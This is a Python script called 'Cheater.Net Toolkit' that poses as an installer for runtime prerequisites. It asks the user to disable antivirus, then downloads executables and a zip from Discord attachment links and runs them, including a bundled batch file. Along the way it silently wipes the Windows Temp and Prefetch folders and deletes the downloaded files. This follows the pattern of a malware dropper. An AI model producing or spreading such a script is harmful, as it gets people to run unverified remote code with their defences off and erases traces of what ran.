import requests
import os
import zipfile
import subprocess

os.system("title Cheater.Net Toolkit")
print("Welcome to the Cheater.Net Toolkit")
print("")
print("To ensure that this process goes smoothly, please disable your Anti-Virus.")
os.system("pause")
os.system("cls")

print("[+] Downloading C++ Redist...")
URL = "https://cdn.discordapp.com/attachments/1163806584607084565/1171189009859498116/Visual-C-Runtimes-All-in-One-May-2023.zip"
response = requests.get(URL)
open("redist.zip", "wb").write(response.content)

print("[+] Downloading DX Web Setup...")
URL = "https://cdn.discordapp.com/attachments/1050786304637546498/1171185460924661821/dxwebsetup.exe"
response = requests.get(URL)
open("dxwebsetup.exe", "wb").write(response.content)

print("[+] Downloading Extra Drivers...")
URL = "https://cdn.discordapp.com/attachments/1050786304637546498/1092889537384030318/ndp48-web.exe"
response = requests.get(URL)
open("ndp48-web.exe", "wb").write(response.content)

print("Clearing Temp and Prefetch...")
subprocess.run(["cmd", "/c", "rmdir", "/s", "/q", "C:\\Windows\\Temp"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.run(["cmd", "/c", "rmdir", "/s", "/q", "C:\\Windows\\Prefetch"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

print("Extracting Files...")
with zipfile.ZipFile('redist.zip', 'r') as zip_ref:
    zip_ref.extractall('redist')

os.system("cls")
subprocess.call(['redist\\install_all.bat'])
os.system("cls")
print("[>] Please proceed with the installation on the new window...")
os.system("dxwebsetup.exe")
os.system("ndp48-web.exe")

files_to_remove = ["dxwebsetup.exe", "redist.zip", "ndp48-web.exe"]
for file in files_to_remove:
    os.remove(file)

os.system("rmdir /s /q redist")
os.system("cls")

os.system("color 2")
print("[+] Process Completed!")
os.system("pause")